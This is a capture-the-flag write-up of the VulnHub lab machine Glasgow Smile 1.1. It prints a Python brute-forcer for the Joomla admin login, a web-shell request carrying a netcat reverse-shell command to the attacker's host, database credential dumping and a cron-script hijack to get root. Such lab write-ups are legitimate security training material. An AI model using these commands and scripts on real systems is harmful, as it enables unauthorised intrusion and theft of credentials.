---
title: VulnHub - Glasgow Smile 1.1
author: ret2x
date: 2021-11-13 22:00:00 +0800
categories: [Walkthrough, VulnHub]
tags: [vulnhub, joomla, rce]
image:
    path: /assets/images/glasgowsmile/front.png
---

**Description:** A linux machine that requires to enumerate a joomla content management system whose login belongs to an administrator user who allows to inject PHP code and therefor execute system commands. Password disclosure and inappropriate configurations allowed gaining root privileges.

**Author:** mindsflee

**Operating System:** Linux

**Download:** [https://www.vulnhub.com/entry/glasgow-smile-11,491/](https://www.vulnhub.com/entry/glasgow-smile-11,491/)

## Information Gathering
### Host Discovery

An ICMP request detected the target machine on the local network, the script you can find it [here](https://github.com/ret2x-tools/ping-scan.git).

```console
root@kali:~$ python3 ping-scan.py -r 192.168.179.0/24
192.168.179.165 is up
```

### Port Scanning

A full TCP port scan with nmap revealed two available ports.

```console
root@kali:~$ nmap -v -n -T4 -p- 192.168.179.165 -oG nmap/all-tcp-ports.txt
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### Service Enumeration

An Aggressive scan was performed on the target machine, but this doesn't reveal much information about the services.

```console
root@kali:~$ nmap -A -n -v -p22,80 192.168.179.165 -oN nmap/enum-services.txt
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 67:34:48:1f:25:0e:d7:b3:ea:bb:36:11:22:60:8f:a1 (RSA)
|   256 4c:8c:45:65:a4:84:e8:b1:50:77:77:a9:3a:96:06:31 (ECDSA)
|_  256 09:e9:94:23:60:97:f7:20:cc:ee:d6:c1:9b:da:18:8e (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
```

### Web Enumeration

As we can see, not much information is found on the main page of the site.

![](/assets/images/glasgowsmile/screenshot-1.png)

So, I decided to run gobuster to brute force and find hidden web content.

```console
root@kali:~$ wfuzz --hc 404 -c -z file,/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://192.168.179.165/FUZZ
...
000006215:   301        9 L      28 W       319 Ch      "joomla" 
```

The tool found a joomla directory, I accessed it, and it redirected me to its home page.

![](/assets/images/glasgowsmile/screenshot-2.png)

Enumerating joomla I found a possible SQL Injection in one of its components, I tried to exploit it but it wasn't possible, so I decided to enumerate by other ways. The tool you can dowanload it [here](https://github.com/rastating/joomlavs).

```console
root@kali:~/joomlavs$ ./joomlavs.rb -u http://192.168.179.165/joomla/ -a
...
[+] Name: com_fields - v3.7.0
 |  Location: http://192.168.179.165/joomla/administrator/components/com_fields
 |  Manifest: http://192.168.179.165/joomla/administrator/components/com_fields/fields.xml
 |  Description: COM_FIELDS_XML_DESCRIPTION
 |  Author: Joomla! Project
 |  Author URL: www.joomla.org

[!] Title: Joomla Component Fields - SQLi Remote Code Execution (Metasploit)
 |  Reference: https://www.exploit-db.com/exploits/44358
```

## Exploitation
### Joomla Login Dictionary Attack

I developed a python script to brute force the login form.

```python
#!/usr/bin/env python3

import requests
import re
import sys
from colorama import init,Fore

init()
green=Fore.GREEN
gray=Fore.LIGHTBLACK_EX
reset=Fore.RESET

def main():

    url="http://192.168.179.165/joomla/administrator/index.php"
    user='joomla'

    s=requests.session()

    def login(password):

        r=requests.get(url)
        token=re.findall("name=(.*)", r.text)
        token=token[-1][1:33]
        cookies=r.cookies.get_dict()

        data={
                'username':user,
                'passwd':password,
                'option':'com_login',
                'task':'login',
                'return':'aW5kZXgucGhw',
                token:1
                }
        
        r=requests.post(url,cookies=cookies,data=data)
        return r.text


    wordlist=open("cewl.list").read().splitlines()

    for passwd in wordlist:
        if 'alert-message' not in login(passwd):
            print(f"{green}[+] {user}:{passwd} {reset:20}")
            sys.exit(0)
        else:
            print(f"{gray}[-] {user}:{passwd}{reset:20}", end='\r')


if __name__=="__main__":
    main()
```

After trying to find the password of several possible users, it ocurred me to create a wordlist with cewl.

```console
root@kali:~$ cewl http://192.168.179.165/joomla -w cewl.list
```

Then, as a last try I used the joomla user to brute force and finally found the password.

```console
root@kali:~$ python3 jf.py
[+] joomla:Gotham
```

I logged in as joomla.

![](/assets/images/glasgowsmile/screenshot-3.png)

### Remote Code Execution

Ones on the dashboard we need to find a way to execute system commands, for this we follow the instructions below.

**Extensions > Templates > Styles**

![](/assets/images/glasgowsmile/screenshot-4.png)

In Styles click on "Beez3" under "Template".

![](/assets/images/glasgowsmile/screenshot-5.png)

We can edit one of these PHP files, in this case I will enter the web shell in the error.php file.

![](/assets/images/glasgowsmile/screenshot-6.png)

We verify if the command "id" is executed correctly.

```console
root@kali:~$ curl http://192.168.179.165/joomla/templates/beez3/error.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

To get a shell, first we need to start a netcat listener and run the following curl request.

```console
root@kali:~$ curl http://192.168.179.165/joomla/templates/beez3/error.php?cmd=$(php -r "echo urlencode('nc 192.168.179.1 443 -e /bin/bash');")
```

To upgrade to a full TTY shell, follow the steps below.

```console
root@kali:~$ nc -vlnp 443
listening on [any] 443 ...
connect to [192.168.179.1] from (UNKNOWN) [192.168.179.165] 35862
script -qc /bin/bash /dev/null
www-data@glasgowsmile:/var/www/html/joomla/templates/beez3$ ^Z
zsh: suspended  nc -vlnp 443
root@kali:~$ stty raw -echo;fg
[1]  + continued  nc -vlnp 443

<www/html/joomla/templates/beez3$ export TERM=xterm-256color                 
 164data@glasgowsmile:/var/www/html/joomla/templates/beez3$ stty rows 39 columns 
www-data@glasgowsmile:/var/www/html/joomla/templates/beez3$
```

Listing the joomla creds to connect to the MySQL database.

```console
www-data@glasgowsmile:/var/www/html/joomla$ cat configuration.php
...
public $dbtype = 'mysqli';
        public $host = 'localhost';
        public $user = 'joomla';
        public $password = 'babyjoker';
        public $db = 'joomla_db';
        public $dbprefix = 'jnqcu_';
        public $live_site = '';
        public $secret = 'fNRyp6KO51013435';
...
```

Listing the MySQL databases.

```console
www-data@glasgowsmile:/var/www/html/joomla$ mysql -u joomla -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 3663
Server version: 10.3.22-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| batjoke            |
| information_schema |
| joomla_db          |
| mysql              |
| performance_schema |
+--------------------+
```

Switching to the "batjoke" database and listing its tables.

```console
MariaDB [joomla_db]> use batjoke;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [batjoke]> show tables;
+-------------------+
| Tables_in_batjoke |
+-------------------+
| equipment         |
| taskforce         |
+-------------------+
2 rows in set (0.001 sec)
```

Retrieving the content of the "taskforce" table.

```console
MariaDB [batjoke]> select * from taskforce;
+----+---------+------------+---------+----------------------------------------------+
| id | type    | date       | name    | pswd                                         |
+----+---------+------------+---------+----------------------------------------------+
|  1 | Soldier | 2020-06-14 | Bane    | YmFuZWlzaGVyZQ==                             |
|  2 | Soldier | 2020-06-14 | Aaron   | YWFyb25pc2hlcmU=                             |
|  3 | Soldier | 2020-06-14 | Carnage | Y2FybmFnZWlzaGVyZQ==                         |
|  4 | Soldier | 2020-06-14 | buster  | YnVzdGVyaXNoZXJlZmY=                         |
|  6 | Soldier | 2020-06-14 | rob     | Pz8/QWxsSUhhdmVBcmVOZWdhdGl2ZVRob3VnaHRzPz8/ |
|  7 | Soldier | 2020-06-14 | aunt    | YXVudGlzIHRoZSBmdWNrIGhlcmU=                 |
+----+---------+------------+---------+----------------------------------------------+
6 rows in set (0.002 sec)
```

In the output we can see that the passwords are in base64, we decode rob's password, since this user exists on the system.

```console
www-data@glasgowsmile:/var/www/html/joomla$ ls /home/
abner  penguin  rob

www-data@glasgowsmile:/var/www/html/joomla$ echo 'Pz8/QWxsSUhhdmVBcmVOZWdhdGl2ZVRob3VnaHRzPz8/' | base64 -d; echo
???AllIHaveAreNegativeThoughts???
```

## Privilege Escalation
### Password Disclosure

I switched to the user rob, in his home directory there is a file called "Abnerineedyourhelp", that contains a ROT and base64 encoded message.

```console
www-data@glasgowsmile:/var/www/html/joomla$ su rob
Password:
rob@glasgowsmile:/var/www/html/joomla$ id
uid=1000(rob) gid=1000(rob) groups=1000(rob),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)


rob@glasgowsmile:~$ ls
Abnerineedyourhelp  howtoberoot  user.txt
rob@glasgowsmile:~$ cat user.txt 
JKR[f5bb11acbb957915e421d62e7253d27a]
rob@glasgowsmile:~$ cat howtoberoot 
  _____ ______   __  _   _    _    ____  ____  _____ ____  
 |_   _|  _ \ \ / / | | | |  / \  |  _ \|  _ \| ____|  _ \ 
   | | | |_) \ V /  | |_| | / _ \ | |_) | | | |  _| | |_) |
   | | |  _ < | |   |  _  |/ ___ \|  _ <| |_| | |___|  _ < 
   |_| |_| \_\|_|   |_| |_/_/   \_\_| \_\____/|_____|_| \_\

NO HINTS.


rob@glasgowsmile:~$ cat Abnerineedyourhelp 
Gdkkn Cdzq, Zqsgtq rteedqr eqnl rdudqd ldmszk hkkmdrr ats vd rdd khsskd rxlozsgx enq ghr bnmchshnm. Sghr qdkzsdr sn ghr eddkhmf zants adhmf hfmnqdc. Xnt bzm ehmc zm dmsqx hm ghr intqmzk qdzcr, "Sgd vnqrs ozqs ne gzuhmf z ldmszk hkkmdrr hr odnokd dwodbs xnt sn adgzud zr he xnt cnm's."
Mnv H mddc xntq gdko Zamdq, trd sghr ozrrvnqc, xnt vhkk ehmc sgd qhfgs vzx sn rnkud sgd dmhflz. RSLyzF9vYSj5aWjvYFUgcFfvLCAsXVskbyP0aV9xYSgiYV50byZvcFggaiAsdSArzVYkLZ==
```

To decode it I used this site [CyberCef](https://gchq.github.io/CyberChef/), as we see, the message is encoded in ROT1.

![](/assets/images/glasgowsmile/screenshot-7.png)

Then we decode abner's base64 encoded password.

```console
rob@glasgowsmile:~$ echo 'STMzaG9wZTk5bXkwZGVhdGgwMDBtYWtlczQ0bW9yZThjZW50czAwdGhhbjBteTBsaWZlMA==' | base64 -d; echo
I33hope99my0death000makes44more8cents00than0my0life0
```

I switched to the user abner.

```console
rob@glasgowsmile:~$ su abner
Password: 
abner@glasgowsmile:/home/rob$ id
uid=1001(abner) gid=1001(abner) groups=1001(abner)
abner@glasgowsmile:/home/rob$ cd
abner@glasgowsmile:~$ ls
info.txt  user2.txt
abner@glasgowsmile:~$ cat user2.txt 
JKR{0286c47edc9bfdaf643f5976a8cfbd8d}
abner@glasgowsmile:~$ cat info.txt 
A Glasgow smile is a wound caused by making a cut from the corners of a victim's mouth up to the ears, leaving a scar in the shape of a smile.
The act is usually performed with a utility knife or a piece of broken glass, leaving a scar which causes the victim to appear to be smiling broadly.
The practice is said to have originated in Glasgow, Scotland in the 1920s and 30s. The attack became popular with English street gangs (especially among the Chelsea Headhunters, a London-based hooligan firm, among whom it is known as a "Chelsea grin" or "Chelsea smile").
```

In abner's commands history a zip file called dear_penguis.zip is unzipped, this catches my attention.

```console
abner@glasgowsmile:~$ cat .bash_history 
...
unzip .dear_penguins.zip
cat dear_penguins
rm dear_penguins
...
```

That file was located in one of the web directories.

```console
abner@glasgowsmile:~$ find / -name '.dear_penguins.zip' 2>/dev/null 
/var/www/joomla2/administrator/manifests/files/.dear_penguins.zip
```

A password is required to unzip the file, I used abner's password and it unzipped successfully.

```console
abner@glasgowsmile:~$ unzip /var/www/joomla2/administrator/manifests/files/.dear_penguins.zip 
Archive:  /var/www/joomla2/administrator/manifests/files/.dear_penguins.zip
[/var/www/joomla2/administrator/manifests/files/.dear_penguins.zip] dear_penguins password: 
  inflating: dear_penguins           
abner@glasgowsmile:~$ ls
dear_penguins  info.txt  user2.txt
abner@glasgowsmile:~$ cat dear_penguins 
My dear penguins, we stand on a great threshold! It's okay to be scared; many of you won't be coming back. Thanks to Batman, the time has come to punish all of God's children! First, second, third and fourth-born! Why be biased?! Male and female! Hell, the sexes are equal, with their erogenous zones BLOWN SKY-HIGH!!! FORWAAAAAAAAAAAAAARD MARCH!!! THE LIBERATION OF GOTHAM HAS BEGUN!!!!!
scf4W7q4B4caTMRhSFYmktMsn87F35UkmKttM5Bz
```

As we can see the unzipped file contains penguin's password, so I switched to it.

```console
abner@glasgowsmile:~$ su penguin
Password: 
penguin@glasgowsmile:/home/abner$ id
uid=1002(penguin) gid=1002(penguin) groups=1002(penguin)
```

Penguin's home directory contains a hidden file named "trash_old".

```console
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ ls -la
total 332
drwxr--r-- 2 penguin penguin   4096 Jun 16  2020 .
drwxr-xr-x 5 penguin penguin   4096 Jun 16  2020 ..
-rwSr----- 1 penguin penguin 315904 Jun 15  2020 find
-rw-r----- 1 penguin root      1457 Jun 15  2020 PeopleAreStartingToNotice.txt
-rwxr-xr-x 1 penguin root       612 Jun 16  2020 .trash_old
-rw-r----- 1 penguin penguin     38 Jun 16  2020 user3.txt
```

```console
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ cat .trash_old 
#/bin/sh

#       (            (              )            (      *    (   (
# (      )\ )   (     )\ ) (      ( /( (  (       )\ ) (  `   )\ ))\ )
# )\ )  (()/(   )\   (()/( )\ )   )\()))\))(   ' (()/( )\))( (()/(()/( (
#(()/(   /(_)((((_)(  /(_)(()/(  ((_)\((_)()\ )   /(_)((_)()\ /(_)/(_)))\
# /(_))_(_))  )\ _ )\(_))  /(_))_  ((__(())\_)() (_)) (_()((_(_))(_)) ((_)
#(_)) __| |   (_)_\(_/ __|(_)) __|/ _ \ \((_)/ / / __||  \/  |_ _| |  | __|
#  | (_ | |__  / _ \ \__ \  | (_ | (_) \ \/\/ /  \__ \| |\/| || || |__| _|
#   \___|____|/_/ \_\|___/   \___|\___/ \_/\_/   |___/|_|  |_|___|____|___|
#

#

 
exit 0
```

Listing the processes we can see that this script is executed, possibly due to a cronjob.

```console
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ ps auxwe
...
root       2761  0.0  0.1   2388   696 ?        Ss   23:23   0:00 /bin/sh -c /home/penguin/SomeoneWhoHidesBehindAMask/.trash_old
...
```


### Cron Job

I edited the "trash_old" file, assigning it a netcat reverse shell.

```console
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ vi .trash_old
```

![](/assets/images/glasgowsmile/screenshot-8.png)

We Then set up a netcat listener and wait a moment to receive our root shell.

```console
root@kali:~$ nc -vlnp 1337
listening on [any] 1337 ...
connect to [192.168.179.1] from (UNKNOWN) [192.168.179.165] 40602
python -c "import pty; pty.spawn('/bin/bash')"
root@glasgowsmile:~# ls
ls
root.txt  whoami
root@glasgowsmile:~# cat root.txt
cat root.txt
  ▄████ ██▓   ▄▄▄       ██████  ▄████ ▒█████  █     █░     ██████ ███▄ ▄███▓██▓██▓   ▓█████ 
 ██▒ ▀█▓██▒  ▒████▄   ▒██    ▒ ██▒ ▀█▒██▒  ██▓█░ █ ░█░   ▒██    ▒▓██▒▀█▀ ██▓██▓██▒   ▓█   ▀ 
▒██░▄▄▄▒██░  ▒██  ▀█▄ ░ ▓██▄  ▒██░▄▄▄▒██░  ██▒█░ █ ░█    ░ ▓██▄  ▓██    ▓██▒██▒██░   ▒███   
░▓█  ██▒██░  ░██▄▄▄▄██  ▒   ██░▓█  ██▒██   ██░█░ █ ░█      ▒   ██▒██    ▒██░██▒██░   ▒▓█  ▄ 
░▒▓███▀░██████▓█   ▓██▒██████▒░▒▓███▀░ ████▓▒░░██▒██▓    ▒██████▒▒██▒   ░██░██░██████░▒████▒
 ░▒   ▒░ ▒░▓  ▒▒   ▓▒█▒ ▒▓▒ ▒ ░░▒   ▒░ ▒░▒░▒░░ ▓░▒ ▒     ▒ ▒▓▒ ▒ ░ ▒░   ░  ░▓ ░ ▒░▓  ░░ ▒░ ░
  ░   ░░ ░ ▒  ░▒   ▒▒ ░ ░▒  ░ ░ ░   ░  ░ ▒ ▒░  ▒ ░ ░     ░ ░▒  ░ ░  ░      ░▒ ░ ░ ▒  ░░ ░  ░
░ ░   ░  ░ ░   ░   ▒  ░  ░  ░ ░ ░   ░░ ░ ░ ▒   ░   ░     ░  ░  ░ ░      ░   ▒ ░ ░ ░     ░   
      ░    ░  ░    ░  ░     ░       ░    ░ ░     ░             ░        ░   ░     ░  ░  ░  ░



Congratulations!

You've got the Glasgow Smile!

JKR{68028b11a1b7d56c521a90fc18252995}


Credits by

mindsflee
```

